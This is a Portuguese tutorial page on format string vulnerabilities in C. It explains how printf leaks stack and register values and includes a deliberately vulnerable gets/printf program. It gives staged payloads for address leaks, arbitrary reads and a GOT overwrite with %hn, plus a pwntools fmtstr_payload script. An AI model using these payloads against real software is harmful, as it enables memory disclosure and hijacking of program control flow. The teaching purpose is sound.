---
title: "Format Strings"
sidebar_position: 2
---

Em C, as funções `printf`, `fprintf` ou qualquer outras parecidas recebem Format Specifiers e colocam variáveis nos lugares deles para imprimir ao usuário.

```C
int value = 1205;

printf("%x %x %x", value, value, value);

// Saída: 4b5 4b5 4b5
```

Mas e se não tivermos argumentos o suficiente para todos os format specifiers?

```C
int value = 1205;

printf("%x %x %x", value);

// Saída: 4b5 5659b000 565981b0
```

O `printf` espera a mesma quantidade de parâmetros que Format Specifiers, e apenas puxa esses parâmetros da stack. Se não há parâmetros suficientes na stack, **a função vai pegar os próximos valores, vazando endereços da stack**.

## Aplicando Format Strings

Temos o seguinte programa em x86:

```C
#include <stdio.h>

int main(void) {
    char buffer[30];
    
    gets(buffer);

    printf(buffer);
    return 0;
}
```

Input: `%x %x %x %x %x`
Output: `f7f74080 0 5657b1c0 782573fc 20782520`

```
────────────────[ STACK ]────────────────
00:0000│ esp 0xffffcf10 —▸ 0xffffcf28 ◂— '%x %x %x %x %x'
01:0004│-0e4 0xffffcf14 —▸ 0xf7d843ac ◂— 0x74656e00
02:0008│-0e0 0xffffcf18 —▸ 0x8048288 ◂— '__libc_start_main'
03:000c│-0dc 0xffffcf1c —▸ 0x804918c (main+26) ◂— add ebx, 0x2e74
04:0010│-0d8 0xffffcf20 ◂— 0x7b1ea71
05:0014│-0d4 0xffffcf24 ◂— 0
06:0018│-0d0 0xffffcf28 ◂— '%x %x %x %x %x'
07:001c│-0cc 0xffffcf2c ◂— 'x %x %x %x'
```

Veja que o que foi vazado foi o **primeiro endereço a partir de esp em diante**: `esp+0x4`, `esp+0x8`,...

Fluxo do printf:

1. printf espera parâmetros após o formato na Stack
2. O primeiro parâmetro (**format string**) está no **topo da pilha** no momento da chamada
3. Os parâmetros seguintes (que deveriam ser os valores para %x) **estariam imediatamente após**

Para chamar `printf(buffer)`, o **compilador** precisa:

1. Empurrar os parâmetros na pilha
2. Chamar a função

Exemplo de preparo de chamada de `printf("%d %d", a, b)`:

```
; Supondo que buffer esteja em [ebp-30]
push b  (34)        ← terceiro parâmetro
push a  (99)        ← segundo parâmetro  
lea eax, [ebp-30]    ; eax recebe endereço do buffer (que contém "%x %x %x %x %x")
push eax         ← primeiro parâmetro
call printf          ; push return address (stack), jump printf (rip)
```

Após `push a, push b, push eax`, teremos a stack desse jeito:

```
(endereços altos)
+------------------+
| ret. add printf  |
+------------------+
| ebp salvo        | ← EBP
+------------------+
| buffer[29]       | \
| ...              |  | buffer (variável local)
| buffer[0]="%x"   | /
+------------------+ 
| b                | ← ESP+12 (onde 2º %d vai buscar)
+------------------+ 
| a                | ← ESP+8 (onde 1º %d vai buscar)
+------------------+
| 1 Parâmetro      | ← ESP+4
+------------------+
| ponteiro p/ buffer| ← ESP APONTA AQUI! (primeiro parâmetro do printf)
+------------------+
(endereços baixos)
```

Após dar `call printf`, agora estamos no Stack Frame da função `printf`:

```
(endereços altos)
+-------------------+ 
| ...               | ↑
+-------------------+ 
| end. retorno main | 
+-------------------+ 
| ebp salvo         | ← EBP da main (antes do printf)
+-------------------+ 
| buffer[29]        | \
| ...               |  | Format String ← região local da main (antes do printf)
| buffer[0]="%x"    | /
+-------------------+
| ???               | ← EBP+16 (onde 2º %d vai buscar)
+-------------------+
| ???               | ← EBP+12 (onde 1º %d vai buscar)
+-------------------+ 
| ponteiro p/ buffer| ← EBP+8 do printf (Format String, 1º Parâmetro do printf)
+-------------------+ 
| ret. add printf   | ← EBP+4 do printf
+-------------------+ 
| ebp salvo (printf)| ← EBP do printf
+-------------------+ 
| vars locais printf| 
+-------------------+ ← ESP dentro do printf
(endereços baixos)
```

A vulnerabilidade de format string **pode vazar TODA a região da pilha**, não importa se a variável tem "relação" com o printf ou não. Isso pois ela permite ver desde o ESP até o EBP da `main` (função que chamou `printf`).

Se pensarmos como blocos, um `printf("%x")` imprime o conteúdo do primeiro bloco depois de **ESP**.

## Diferença entre 32-bit e 64-bit

### x86 (32-bit)
- Argumentos são passados na **stack**
- printf vai buscar o valor para `%x` do próximo endereço na stack
- Isso seria aproximadamente ESP+4 (considerando o endereço de retorno na stack)

Antes de chamar printf:
```
ESP   → endereço de retorno
ESP+4 → possivelmente o primeiro argumento (se houvesse)
ESP+8 → segundo argumento, etc.
```

Quando printf("%x") é chamado:
- printf espera encontrar o valor para %x em ESP+4
- Mas ESP+8 contém o endereço de retorno ou lixo

```
EBP+0   → RBP antigo
EBP+4   → endereço de retorno
ESP+8 → possivelmente o primeiro argumento (se houvesse)
ESP+12 → segundo argumento, etc.
```

### x86-64 (64-bit)

- Os primeiros argumentos são passados em registradores
- `printf` vai primeiro olhar nos registradores que armazenam parâmetros (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`)
- Só depois busca na stack

Lembrando a ordem de passagem de argumentos para registradores:

1. `RDI` (Endereço da Format String)
2. `RSI`  (Parâmetro 1)
3. `RDX` (Parâmetro 2)
4. `RCX` (...)
5. `R8`
6. `R9`
7. Stack (RSP+8, RSP+16, ...)

Se usarmos `printf("%x")`, veremos o que há de conteúdo no registrador `RSI`, que pode ser lixo de memória ou valor usado anteriormente pela função que fez a `call`.

Isso nem sempre é muito útil. Mas se usarmos `printf("%x %x %x %x %x %x %x")`, temos:

```
%x 1 → RSI (2º registrador)
%x 2 → RDX (3º registrador)  
%x 3 → RCX (4º registrador)
%x 4 → R8  (5º registrador)
%x 5 → R9  (6º registrador)
%x 6 → Stack (RSP+8)  ← AQUI COMEÇA A STACK!
%x 7 → Stack (RSP+16)
```

## Tipos de Format Strings

- `%x` - Imprime conteúdo do bloco de memória em hexadecimal. `%p` faz a mesma coisa, mas coloca `0x` na frente.
```c
printf("%x");        // Vaza 4 bytes da stack
printf("%08x");      // Vaza com padding (8 dígitos)
```
- `%s` - Imprime string até null byte. Ao receber um bloco da stack como parâmetro, tenta interpretar o conteúdo do bloco como ponteiro, indo até esse endereço e imprimindo o conteúdo como string.
  - Se argumento for endereço válido - Lê até null byte
  - Se for endereço inválido - Segmentation fault
  - Se controlarmos o argumento, podemos ler a string de qualquer endereço (BOF - Variável)
```c
printf("%s", 0x404000);  // Lê string do endereço 0x404000
printf("%s");            // Tenta ler endereço da stack como ponteiro
```
- `%n` - Escreve o número de bytes impressos até agora no endereço dado. Não imprime texto, mas escreve em um endereço de memória.
  - `%n`- Escreve int (4 bytes)
  - `%hn` - Escreve short (2 bytes)
  - `%hhn` - Escreve char (1 byte)
```C
printf("%100x%n", 0, &var);  // Escreve 100 em &var 
// (você pode usar isso para escrever o valor que quiser no bloco de memória)
```

## Exemplo de payload

Exemplo 1:
```
# 1. Reconhecimento: Onde está nosso input? (encontrar os AAAA = 0x41414141)
AAAA.%x.%x.%x.%x.%x.%x

# 2. Leak de endereços (bypass ASLR)
%p.%p.%p.%p.%p.%p.%p

# 3. Arbitrary Read: ler de 0x404000
# (primeiro colocar 0x404000 no buffer)
\x00\x40\x40\x00.%s

# 4. Arbitrary Write: sobrescrever GOT entry
# Escrever 0xdeadbeef em 0x404020
# Usando %hn para write parcial

\x20\x40\x40\x00\x00\x00\x00\x00   # addr_low (0x404020)
\x22\x40\x40\x00\x00\x00\x00\x00   # addr_high (0x404022)
%.48863x                           # Padding para 0xbeef
%7$hn                              # Write para addr_low
%.8126x                            # Padding para 0xdead  
%8$hn                              # Write para addr_high
```

- Descobrimos que nosso input/buffer é armazenado no 7º argumento que o `printf` dá
- `%7$hn`: Acessa o 7º "argumento" (primeiro endereço: `0x404020`)
  - Escreve o número de bytes impressos até agora (48879 = `0xbeef`)
  - No endereço `0x404020`
- `%8$hn`: Acessa o 8º "argumento" (segundo endereço: 0x404022)
  - Escreve o total de bytes impressos (57005 = `0xdead`)
  - No endereço `0x404022`

## Arbitrary Write (%) com Pwntools

O pwntools possui um módulo para facilitar o arbitrary write por %`n`, e tende a ser muito mais fácil de utilizar.

```py
from pwn import *

context.binary = elf = ELF('./vuln')

offset = 7  # Posição onde o buffer começa nos argumentos (AAAA.%1$p %2$p %3$p... %7$p)
# Aqui, supõe-se que AAAA começa no resgate do 7° argumento

writes = {
    elf.got['puts']: elf.sym['win']  # {endereço_alvo: novo_valor}
}

# Gera e envia o payload
payload = fmtstr_payload(offset, writes)
p.sendline(payload)
```